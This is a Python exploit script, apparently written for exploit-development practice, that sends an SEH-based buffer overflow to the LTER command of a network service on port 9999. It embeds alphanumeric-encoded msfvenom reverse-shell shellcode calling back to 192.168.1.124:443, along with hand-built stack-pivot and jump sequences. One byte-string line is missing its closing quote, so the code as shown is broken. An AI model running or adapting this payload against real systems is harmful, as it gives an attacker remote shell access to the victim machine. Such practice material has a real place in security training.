import socket


def get_payload():
    CRASH_LEN = 4000
    
    ###########################################################################
    ### In this block we need to point ESP to the start of our shellcode
    # Push ebx, pop eax 
    # e.g copy ebx to eax ( ebx holds our current address )
    buf =  b"\x53\x58"

    # Increase AL by 6 bytes
    buf += b"\x04\x06"
    # Push eax, pop esp
    # E.g copy eax into esp
    buf += b"\x50\x5c"
    # Point it one more byte ahead so its on the 4 byte allignment
    buf += b"\x44"
    
    ###########################################################################
    # msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread
    # LHOST=192.168.1.124 LPORT=443 -f python -b '\x00'
    # -e x86/alpha_mixed BufferRegister=ESP
    buf += b"\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
    buf += b"\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
    buf += b"\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
    buf += b"\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
    buf += b"\x79\x6c\x69\x78\x4b\x32\x73\x30\x37\x70\x33\x30\x53"
    buf += b"\x50\x4e\x69\x7a\x45\x64\x71\x69\x50\x63\x54\x4c\x4b"
    buf += b"\x70\x50\x76\x50\x4e\x6b\x72\x72\x74\x4c\x6c\x4b\x72"
    buf += b"\x72\x34\x54\x6c\x4b\x34\x32\x31\x38\x64\x4f\x6e\x57"
    buf += b"\x61\x5a\x47\x56\x75\x61\x79\x6f\x4c\x6c\x67\x4c\x35"
    buf += b"\x31\x31\x6c\x53\x32\x34\x6c\x47\x50\x6f\x31\x78\x4f"
    buf += b"\x66\x6d\x63\x31\x48\x47\x6d\x32\x5a\x52\x46\x32\x76"
    buf += b"\x37\x4c\x4b\x46\x32\x46\x70\x6e\x6b\x51\x5a\x65\x6c"
    buf += b"\x4e\x6b\x72\x6c\x44\x51\x53\x48\x6d\x33\x62\x68\x35"
    buf += b"\x51\x58\x51\x36\x31\x4e\x6b\x46\x39\x57\x50\x75\x51"
    buf += b"\x59\x43\x6c\x4b\x61\x59\x77\x68\x48\x63\x34\x7a\x70"
    buf += b"\x49\x4c\x4b\x56\x54\x6e\x6b\x43\x31\x6e\x36\x34\x71"
    buf += b"\x49\x6f\x6e\x4c\x5a\x61\x38\x4f\x76\x6d\x33\x31\x78"
    buf += b"\x47\x74\x78\x59\x70\x52\x55\x58\x76\x56\x63\x33\x4d"
    buf += b"\x6a\x58\x45\x6b\x33\x4d\x47\x54\x44\x35\x48\x64\x46"
    buf += b"\x38\x4e\x6b\x30\x58\x64\x64\x45\x51\x6b\x63\x50\x66"
    buf += b"\x6c\x4b\x54\x4c\x30\x4b\x4e\x6b\x51\x48\x77\x6c\x57"
    buf += b"\x71\x69\x43\x6e\x6b\x63\x34\x4c\x4b\x36\x61\x58\x50"
    buf += b"\x6e\x69\x52\x64\x37\x54\x31\x34\x31\x4b\x61\x4b\x51"
    buf += b"\x71\x62\x79\x31\x4a\x32\x71\x39\x6f\x39\x70\x31\x4f"
    buf += b"\x33\x6f\x52\x7a\x6c\x4b\x62\x32\x48\x6b\x6c\x4d\x51"
    buf += b"\x4d\x65\x38\x45\x63\x56\x52\x33\x30\x55\x50\x31\x78"
    buf += b"\x54\x37\x52\x53\x65\x62\x51\x4f\x61\x44\x50\x68\x72"
    buf += b"\x6c\x70\x77\x61\x36\x57\x77\x4b\x4f\x68\x55\x38\x38"
    buf += b"\x6a\x30\x73\x31\x77\x70\x65\x50\x36\x49\x4b\x74\x52"
    buf += b"\x74\x52\x70\x31\x78\x36\x49\x6d\x50\x62\x4b\x73\x30"
    buf += b"\x6b\x4f\x4e\x35\x66\x30\x30\x50\x46\x30\x30\x50\x47"
    buf += b"\x30\x42\x70\x31\x50\x46\x30\x35\x38\x6a\x4a\x76\x6f"
    buf += b"\x69\x4f\x79\x70\x4b\x4f\x4a\x75\x6c\x57\x30\x6a\x44"
    buf += b"\x45\x55\x38\x4b\x70\x69\x38\x57\x71\x33\x4c\x63\x58"
    buf += b"\x57\x72\x63\x30\x45\x51\x4f\x4b\x4d\x59\x6a\x46\x73"
    buf += b"\x5a\x62\x30\x50\x56\x46\x37\x42\x48\x4e\x79\x6d\x75"
    buf += b"\x61\x64\x50\x61\x4b\x4f\x4b\x65\x4f\x75\x49\x50\x54"
    buf += b"\x34\x64\x4c\x49\x6f\x50\x4e\x33\x38\x30\x75\x7a\x4c"
    buf += b"\x75\x38\x4a\x50\x4d\x65\x6d\x72\x66\x36\x4b\x4f\x39"
    buf += b"\x45\x33\x58\x35\x33\x70\x6d\x53\x54\x47\x70\x6e\x69"
    buf += b"\x6b\x53\x61\x47\x72\x77\x76\x37\x50\x31\x6c\x36\x53"
    buf += b"\x5a\x56\x72\x43\x69\x53\x66\x7a\x42\x39\x6d\x35\x36"
    buf += b"\x6b\x77\x77\x34\x67\x54\x37\x4c\x76\x61\x65\x51\x6c"
    buf += b"\x4d\x62\x64\x36\x44\x36\x70\x4a\x66\x35\x50\x50\x44"
    buf += b"\x31\x44\x70\x50\x52\x76\x50\x56\x46\x36\x51\x56\x53"
    buf += b"\x66\x52\x6e\x72\x76\x63\x66\x46\x33\x66\x36\x33\x58"
    buf += b"\x42\x59\x6a\x6c\x55\x6f\x6c\x46\x79\x6f\x6b\x65\x4d"
    buf += b"\x59\x69\x70\x70\x4e\x43\x66\x50\x46\x39\x6f\x56\x50"
    buf += b"\x43\x58\x45\x58\x6c\x47\x75\x4d\x73\x50\x6b\x4f\x68"
    buf += b"\x55\x4f\x4b\x6d\x30\x77\x6d\x64\x6a\x75\x5a\x30\x68"
    buf += b"\x4f\x56\x4c\x55\x6d\x6d\x4d\x4d\x69\x6f\x39\x45\x57"
    buf += b"\x4c\x77\x76\x53\x4c\x75\x5a\x4d\x50\x49\x6b\x6d\x30"
    buf += b"\x64\x35\x75\x55\x4d\x6b\x77\x37\x37\x63\x72\x52\x42"
    buf += b"\x4f\x50\x6a\x77\x70\x56\x33\x69\x6f\x58\x55\x41\x41"


    ###########################################################################
    maths =  3383 - len(buf)
    PRE_OFFSET = b""
    PRE_OFFSET += buf
    A_BUF = b"A" * maths
    PRE_OFFSET +=  A_BUF
    # 22   3405

    ###########################################################################
    LONG = b""
    # Get our Stack pointer and put it in eax
    LONG += b"\x54\x58"   
    # These additions move our stack pointer to the bottem of our "B" buffer
    # Add 0x117f to our eax
    LONG += b"\x66\x05\x7f\x11
    # Add 0x0A to eax
    LONG += b"\x04\x0a"
    # Set ESP to our new value
    LONG += b"\x50\x5c"
    # Copy the stack pointer from eax to ebx
    LONG += b"\x50\x5b"
    # This block was generated using slink and translates to:
    # Sub ebx, 0x0da6
    # Call EBX
    # This has the effect of dropping us directly to the top of our "A" buffer
    # As 67ffdb - 0xda6 = 67f235 ( The start of our A )      
    long_jmp = b""
    long_jmp += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
    long_jmp += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
    long_jmp += b"\x05\x11\x11\x77\x62" ## add  eax, 0x62771111
    long_jmp += b"\x05\x11\x11\x66\x62" ## add  eax, 0x62661111
    long_jmp += b"\x05\x11\x11\x55\x42" ## add  eax, 0x42551111
    long_jmp += b"\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
    long_jmp += b"\x50"                 ## push eax
    long_jmp += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
    long_jmp += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
    long_jmp += b"\x05\x41\x76\x53\x07" ## add  eax, 0x07537641
    long_jmp += b"\x05\x40\x75\x53\x06" ## add  eax, 0x06537540
    long_jmp += b"\x50"                 ## push eax

    LONG += long_jmp
    PRE_OFFSET += LONG
    OFFSET = PRE_OFFSET + (b"B" * (3495 - len(PRE_OFFSET)))
    # OFFSET = b"A" * 3495
    print(len(OFFSET))
    
    ###########################################################################
    
    
    # pop pop ret 6250172bi
    SEH = b"\x2b\x17\x50\x62"
    # Jump 8 bytes if not zero
    NSEH = b"\x75\x08"
    # jump 6 bytes if zero
    NSEH += b"\x74\x06"

    payload = OFFSET
    payload += NSEH
    payload += SEH
   
    # little bit of padding
    payload += b"\x41\x41\x41"
    # DEC ESP twice so we clear parrity flag
    payload += b"\x4c\x4c"
    
    # Exploiting the bad char wrap around with FF
    # Jump 80 if carry flag and zero flag are set
    payload += b"\x77\xff"
    # Fill out the buffer
    padding = b"D" * (CRASH_LEN - len(payload))
    payload = payload + padding
    return payload

def main():
    HOST = "192.168.1.116"
    PORT = 9999
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST,PORT))
    banner = s.recv(1024)
    payload = b"LTER /:./"
    payload += get_payload()
    s.send(payload)
    print("Sent %s bytes" % len(payload))

if __name__ == '__main__':
    main()
